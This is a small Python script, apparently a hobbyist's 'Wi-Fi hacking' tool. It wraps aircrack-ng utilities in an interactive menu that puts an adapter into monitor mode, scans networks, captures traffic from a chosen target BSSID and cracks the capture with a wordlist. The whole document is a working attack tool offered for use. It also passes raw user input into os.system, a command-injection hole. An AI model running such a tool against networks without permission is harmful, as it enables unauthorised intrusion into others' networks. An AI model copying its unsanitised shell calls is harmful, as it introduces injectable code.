#Wifi hacking using Aircrack-ng

import os
print("""

█░█░█ █ █▀▀ █   █░█ ▄▀█ █▀▀ █▄▀ █ █▄░█ █▀▀   ▄▀█ █░█ ▀█▀ █▀█
▀▄▀▄▀ █ █▀░ █   █▀█ █▀█ █▄▄ █░█ █ █░▀█ █▄█   █▀█ █▄█ ░█░ █▄█ BY YATHARTH\n
""")
print("#####################################DEVELOPER INFO#################################################")
print("\nfollow on instagram @im.yatharth")
print("Visit Github:-  https://github.com/yatharthgeek/")
print("Subscribe YouTube Channel :- https://www.youtube.com/channel/UC6AXassf_ZGu-icFW8iT0-Q")
print(" \n")
print("####################################################################################################\n")
print("Checking for Adapters...\n")
os.system("iwconfig")
print("\nPlease Enter Adapter name to get into Main Menu !\n")
print(" ")
#Main data
infn= input("[WiFi adpater Name] >> ")
print("Adapter Name Saved For :",infn)
print("\nType help for help !!\n")
# Code starts here
while 1==1:
   
    bash= input("[Wi-Fi Tool] >> ")
    
    if bash == "start":

        if infn==infn:
            code1= "airmon-ng start "+infn 
            os.system(code1)


    if bash == "stop":
        

        if infn==infn:
            code1= "airmon-ng stop "+infn+"mon" 
            os.system(code1)


    if bash == "scan":
        code1= "airodump-ng "+infn+"mon"
        os.system(code1)

    if bash== "get-in":
        
        bssid= input("[target BSSID] >>")
        file= input("[File Name] >>")
        channel=input("[Channel No] >>")
        code1= "airodump-ng -w "+file+" -c "+channel+" --bssid "+bssid+" "+infn+"mon"
        
        print(" ")
        os.system(code1)

    if bash=="crack":
        capfile=input("[Cap file location] >> ")
        wordlist=input("[Wordlist location] >> ")
        code1= "aircrack-ng "+capfile+" -w "+wordlist
        os.system(code1)

    if bash =="help":
        print("Commands\n"\
            " \n"\

            "start                  To Start Program\n"\
                "scan                   To Scan Network\n"\
                    "get-in             To Enter a Network\n" \
                        "crack                  To Crack the Network\n")

    

    

    

    

    

    
